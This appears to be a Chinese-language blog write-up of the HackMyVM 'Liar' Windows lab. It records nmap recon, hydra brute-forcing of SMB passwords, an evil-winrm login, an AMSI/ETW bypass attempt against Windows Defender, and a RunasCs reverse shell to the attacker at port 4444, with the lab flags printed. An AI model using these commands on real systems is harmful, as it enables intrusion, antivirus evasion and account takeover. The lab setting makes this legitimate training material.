+++
date = '2026-11-07T20:34:13+08:00'
draft = false
title = '[HMV]Liar渗透记录'
tags = ['HackMyVM','Windows','WinRM']
+++

## 主机发现与端口扫描

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.12

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.12     00:0c:29:c6:a0:8e       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.116 seconds (120.98 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.12 -oA nmapscan/ports
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 22:44 +0800
Warning: 10.10.10.12 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.12
Host is up (0.00042s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3327/tcp  filtered bbars
5985/tcp  open     wsman
15017/tcp filtered unknown
17129/tcp filtered unknown
19801/tcp filtered unknown
26193/tcp filtered unknown
26822/tcp filtered unknown
27659/tcp filtered unknown
28982/tcp filtered unknown
32230/tcp filtered unknown
40248/tcp filtered unknown
40902/tcp filtered unknown
40912/tcp filtered unknown
47001/tcp open     winrm
47220/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49673/tcp open     unknown
56406/tcp filtered unknown
58911/tcp filtered unknown
59434/tcp filtered unknown
59577/tcp filtered unknown
MAC Address: 00:0C:29:C6:A0:8E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
```

因为端口较多, 所以提取开放的端口并存入变量

```shell
ports=$(grep open nmapscan/ports.nmap | awk -F'/' '{print $1}' | paste -sd ',')
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ sudo nmap -sT -sV -sC -O -p$ports 10.10.10.12 -oA nmapscan/detail
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 22:49 +0800
Nmap scan report for 10.10.10.12
Host is up (0.00094s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:C6:A0:8E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 11 24H2 (93%), Microsoft Windows Server 2016 (93%), Microsoft Windows 10 21H2 (92%), Microsoft Windows 10 20H2 (91%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1909 (91%), Microsoft Windows 10 1809 (90%), Microsoft Windows 10 1903 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:c6:a0:8e (VMware)
| smb2-time:
|   date: 2026-11-07T14:50:41
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.22 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ sudo nmap --script=vuln -p$ports 10.10.10.12 -oA nmapscan/vuln
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 22:53 +0800
Nmap scan report for 10.10.10.12
Host is up (0.0013s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
MAC Address: 00:0C:29:C6:A0:8E (VMware)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 136.72 seconds
```

## Web服务信息收集

匿名列出SMB共享被拒

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ smbclient -L 10.10.10.12 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

浏览器访问80端口, 末尾的`nica`可能是用户名

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Liar/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

目录爆破一无所获

```shell
┌──(kali㉿kali)-[~/Liar]                 
└─$ dirsearch -u http://10.10.10.12/ -i 200,301,302,500                  
  _|. _ _  _  _  _ _|_    v0.4.4         
 (_||| _) (/_(_|| (_| ) 
                                         
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.10.10.12/

[23:02:22] Scanning: 

Task Completed
```

访问47001和5985端口, 都是Not Found, 目录爆破也没有收获

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Liar/%E5%85%B6%E5%AE%83Web%E7%AB%AF%E5%8F%A3.avif)

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ dirsearch -u http://10.10.10.12:5985/ -i 200,301,302,500

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.10.10.12:5985/

[23:06:01] Scanning: 
                                                                             
Task Completed
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Liar]
└─$ dirsearch -u http://10.10.10.12:47001/ -i 200,301,302,500

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.10.10.12:47001/

[23:06:42] Scanning: 
                                                                             
Task Completed
```

## SMB爆破

尝试使用hydra爆破, 用户名`nica`, 出现错误

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ hydra -l nica -P /usr/share/wordlists/rockyou.txt smb://10.10.10.12/
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-08 10:45:44
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://10.10.10.12:445/
[ERROR] invalid reply from target smb://10.10.10.12:445/
```

回顾之前Nmap扫描结果, 发现目标使用的是SMBv2, 切换协议重试

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ hydra -l nica -P /usr/share/wordlists/rockyou.txt smb2://10.10.10.12/
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-08 10:50:00
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking smb2://10.10.10.12:445/
[WARNING] 10.10.10.12 might accept any credential
[445][smb2] host: 10.10.10.12   login: nica   password: hardcore
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-08 10:50:05
```

发现密码`hardcore`  
列出SMB共享目录

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ smbclient -L 10.10.10.12 -U nica
Password for [WORKGROUP\nica]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.12 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

尝试查看目录内容, 结果ADMIN\$和C\$都无权限, IPC\$是空的

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ smbclient //10.10.10.12/IPC$ -U nica
Password for [WORKGROUP\nica]:
Try "help" to get a list of possible commands.
smb: \> ls -lah
smb: \> exit

┌──(kali㉿kali)-[~/Liar]
└─$ smbclient //10.10.10.12/ADMIN$ -U nica
Password for [WORKGROUP\nica]:
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Liar]
└─$ smbclient //10.10.10.12/C$ -U nica
Password for [WORKGROUP\nica]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

## WinRM登录

Nmap的扫描结果中显示开启了5985端口, 这通常是WinRM服务

WinRM 最主要的用途是支撑 PowerShell 远程处理（PowerShell Remoting），让管理员可以在一台计算机上向多台远程计算机发送命令并收集结果。WinRM 服务在后台运行，监听网络请求。当它收到传入的流量时，会检查数据包中标记的“目标应用程序”信息，然后将请求转发给对应的程序（如 PowerShell）来处理。

使用evil-winrm连接

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ evil-winrm -i 10.10.10.12 -u nica -p hardcore
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\nica\Documents>
```

成功获得shell

## 权限提升

### 枚举

查看当前用户身份

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> whoami
win-iurf14rbvgv\nica
```

查看当前文件夹, 发现是空的

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> ls
*Evil-WinRM* PS C:\Users\nica\Documents>
```

查看上一级目录, 发现flag

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> cd ../
*Evil-WinRM* PS C:\Users\nica> ls


    Directorio: C:\Users\nica


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018   9:12 AM                Desktop
d-r---        9/26/2023   6:44 PM                Documents
d-r---        9/15/2018   9:12 AM                Downloads
d-r---        9/15/2018   9:12 AM                Favorites
d-r---        9/15/2018   9:12 AM                Links
d-r---        9/15/2018   9:12 AM                Music
d-r---        9/15/2018   9:12 AM                Pictures
d-----        9/15/2018   9:12 AM                Saved Games
d-r---        9/15/2018   9:12 AM                Videos
-a----        9/26/2023   6:44 PM             10 user.txt


*Evil-WinRM* PS C:\Users\nica> cat user.txt
HMVWINGIFT
```

使用`net users`列出所有用户信息

```shell
*Evil-WinRM* PS C:\Users\nica\Desktop> net users

Cuentas de usuario de \\

-------------------------------------------------------------------------------
Administrador            akanksha                 DefaultAccount
Invitado                 nica                     WDAGUtilityAccount
El comando se ha completado con uno o m s errores.
```

发现管理员用户名是`akanksha`, 爆破得到密码`sweetgirl`

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ hydra -l akanksha -P /usr/share/wordlists/rockyou.txt smb2://10.10.10.12/
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-08 11:47:08
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking smb2://10.10.10.12:445/
[WARNING] 10.10.10.12 might accept any credential
[445][smb2] host: 10.10.10.12   login: akanksha   password: sweetgirl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-08 11:47:16
```

使用evil-winrn无法登录

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ evil-winrm -i 10.10.10.12 -u akanksha -p sweetgirl
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Error: Cannot establish connection to remote endpoint. Check credentials and network.
                                        
Error: WinRM::WinRMAuthorizationError: WinRM::WinRMAuthorizationError
```

### RunasCS提权

使用[RunasCS](https://github.com/antonioCoco/RunasCs)在nica会话中以akanksha身份执行命令

首先上传工具

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> upload /home/kali/Liar/RunasCs.exe "C:/Users/nica/Documents/"
                                        
Info: Uploading /home/kali/Liar/RunasCs.exe to C:\Users\nica\Documents\
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

然而运行后没有任何反应, 再次运行后发现被删了

```powershell
*Evil-WinRM* PS C:\Users\nica> ./RunasCs.exe akanksha sweetgirl cmd.exe -r 10.10.10.3:4444
The term './RunasCs.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was includ
ed, verify that the path is correct and try again.               
At line:1 char:1                                                                   
+ ./RunasCs.exe akanksha sweetgirl cmd.exe -r 10.10.10.3                       
+ ~~~~~~~~~~~~~                                                                    
    + CategoryInfo          : ObjectNotFound: (./RunasCs.exe:String) [], CommandNotFoundException                                                                      
    + FullyQualifiedErrorId : CommandNotFoundException
```

ps看到后台存在`MsMpEng`进程(Windows Defender)

```text
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                                                                  
    265      12     2084       5040               340   0 csrss                                                                                                        
    165       9     1724       7992               420   1 csrss                                                                                                        
     49       6     1376       4068               640   1 fontdrvhost                                                                                                  
     49       6     1264       3684               648   0 fontdrvhost              
      0       0       56          8                 0   0 Idle                     
    821      21     4512      12380               548   0 lsass                    
    227      13     2908      10020              2984   0 msdtc                    
    693     229   250628     206668              1392   0 MsMpEng                  
    157      38     4760       7596              2384   0 NisSrv                   
      0       3      288      34072                68   0 Registry                 
    280      10     2736       6784               540   0 services                 
     53       3      508       1252               236   0 smss
    147       8     1608       7344               268   0 svchost                  
    748      42     8632      21840               408   0 svchost
    403      14     3064       9980               664   0 svchost                                                                                                      
    381      15     2632       8456               752   0 svchost                  
    411      33     5292      12936               812   0 svchost                  
    116       7     1172       5844               872   0 svchost
    459      16    10552      16852               940   0 svchost                  
   1173      40    20404      38864               980   0 svchost                  
    341      19     4368      10924              1012   0 svchost                  
    168      12     1556       6996              1124   0 svchost                  
    169      11     3648      10584              1204   0 svchost                  
    261      14     8468      16508              1212   0 svchost                  
    351      15     6364      16200              1228   0 svchost                  
    317      21     8852      14456              1364   0 svchost                                                                                                      
    198      10     2004       8060              1372   0 svchost                                                                                                      
    214      12     1744       7368              1380   0 svchost                  
    226      14     4392      11328              1412   0 svchost                  
    938       0      192        144                 4   0 System                   
    170      11     1312       6872               412   0 wininit                  
    211      10     2164       8892               476   1 winlogon                                                                                                     
    185      10     2368       8160              2732   0 WmiPrvSE                 
    831      27    47452      65608       0.45   2068   0 wsmprovhost              
    804      27    48872      67268       0.36   2232   0 wsmprovhost
```

上传ps脚本格式的RunasCs模块

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> upload /home/kali/Liar/Invoke-RunasCs.ps1 ./
                                        
Info: Uploading /home/kali/Liar/Invoke-RunasCs.ps1 to C:\Users\nica\Documents\
                                        
Data: 117712 bytes of 117712 bytes copied
                                        
Info: Upload successful!
```

导入模块被拦截

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> Import-Module ./Invoke-RunasCs.ps1
At C:\Users\nica\Documents\Invoke-RunasCs.ps1:1 char:1
+ function Invoke-RunasCs
+ ~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At C:\Users\nica\Documents\Invoke-RunasCs.ps1:1 char:1
+ function Invoke-RunasCs
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

使用evil-winrm自带的AMSI 绕过功能

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
At line:1 char:1 |▓▓▓▓▓▓▓▓▓▒|          
+ 
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

Multiple ambiguous overloads found for "Copy" and the argument count: "4".
At line:2 char:1
+ $0gj5wztLYmGySts = [SYstEm.RuNTime.INteropServICES.MarsHAl]::Copy($ry ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodCountCouldNotFindBest
                                        
Info: Patching ETW, please be patient ..
                                        
[+] Success!
```

再次导入模块, 还是不行

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> Import-Module "C:/Users/nica/Documents/Invoke-RunasCs.ps1"
At C:\Users\nica\Documents\Invoke-RunasCs.ps1:1 char:1
+ function Invoke-RunasCs
+ ~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At C:\Users\nica\Documents\Invoke-RunasCs.ps1:1 char:1
+ function Invoke-RunasCs
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

上网查了一下, 这里要用1.4版本的RunasCs, 上传旧版后再执行

```powershell
*Evil-WinRM* PS C:\Users\nica\Documents> ./RunasCs.exe akanksha sweetgirl cmd.exe -r 10.10.10.3:4444
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-b06d1$\Default
[+] Async process 'cmd.exe' with pid 2548 created and left in background.
```

成功拿到shell

```shell
┌──(kali㉿kali)-[~/Liar]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.12] 49692
Microsoft Windows [Versi�n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
win-iurf14rbvgv\akanksha
```

在Administrador目录中发现root.txt

```shell
C:\Users\Administrador>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41

 Directorio de C:\Users\Administrador

26/09/2023  17:36    <DIR>          .
26/09/2023  17:36    <DIR>          ..
26/09/2023  14:11    <DIR>          3D Objects
26/09/2023  14:11    <DIR>          Contacts
26/09/2023  14:11    <DIR>          Desktop
26/09/2023  14:11    <DIR>          Documents
26/09/2023  14:11    <DIR>          Downloads
26/09/2023  14:11    <DIR>          Favorites
26/09/2023  14:11    <DIR>          Links
26/09/2023  14:11    <DIR>          Music
26/09/2023  14:24            16.418 new.cfg
26/09/2023  14:11    <DIR>          Pictures
26/09/2023  17:36                13 root.txt
26/09/2023  14:11    <DIR>          Saved Games
26/09/2023  14:11    <DIR>          Searches
26/09/2023  14:11    <DIR>          Videos
               2 archivos         16.431 bytes
              14 dirs  45.614.034.944 bytes libres
```

```text
type root.txt
HMV1STWINDOWZ
```
